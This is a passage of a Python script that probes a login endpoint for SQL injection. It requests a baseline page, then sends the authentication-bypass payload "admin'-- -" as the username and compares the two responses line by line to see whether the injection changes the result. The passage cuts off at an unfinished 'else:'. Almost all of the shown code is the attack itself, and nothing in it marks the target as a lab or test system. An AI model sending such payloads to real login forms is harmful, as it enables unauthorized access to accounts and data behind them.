print("[BASELINE - No parameters]")
print("="*80)
print(resp.text)
print(f"\nLength: {len(resp.text)} bytes\n")

# Now with SQL injection
resp_sqli = requests.get(target, params={'username': "admin'-- -", 'password': 'x'})
print("="*80)
print("[WITH SQL INJECTION - admin'-- -]")
print("="*80)
print(resp_sqli.text)
print(f"\nLength: {len(resp_sqli.text)} bytes\n")

# Check if they're different
if resp.text != resp_sqli.text:
    print("="*80)
    print("[DIFFERENCES FOUND]")
    print("="*80)
    
    # Find the differences
    lines1 = resp.text.split('\n')
    lines2 = resp_sqli.text.split('\n')
    
    for i, (line1, line2) in enumerate(zip(lines1, lines2)):
        if line1 != line2:
            print(f"Line {i} DIFFERS:")
            print(f"  No params: {line1}")
            print(f"  With SQLi: {line2}")
else:
